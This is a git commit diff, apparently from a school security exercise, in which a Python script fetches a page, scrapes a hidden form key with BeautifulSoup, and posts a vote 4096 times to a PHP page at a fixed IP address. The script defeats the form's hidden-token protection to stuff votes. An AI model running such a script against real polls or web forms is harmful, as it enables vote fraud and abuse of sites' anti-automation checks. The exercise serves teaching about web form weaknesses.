36eb13a68d46839ed9630f6c2e669fae548e2ba0
edward0rtiz <931@holbertonschool.com>
2019-10-13 21:11:59 -0500

    [feature] level 1 usiong bs4 o get session hidden keys and then post it

--- level_1/challenge_1.py
+++ level_1/challenge_1.py
@@ -1,14 +1,22 @@
 #!/usr/bin/python3
 
 import requests
+from bs4 import BeautifulSoup
 
 php = "http://158.69.76.135/level1.php"
 
 vote = {
     "id": "931",
-    "holdthedoor": "Submit"
+    "holdthedoor": "holdthedoor", "key": ""
 }
 
 if __name__ == "__main__":
     for i in range(0, 4096):
-        requests.post(php, data=vote)
+        s = requests.session()
+        p = s.get(php)
+        soup = BeautifulSoup(p.text, "html.parser")
+        hv = soup.find("form", {"method": "post"})
+        hv = hv.find("input", {"type": "hidden"})
+        vote["key"] = hv["value"]
+
+        s.post(php, data=vote)
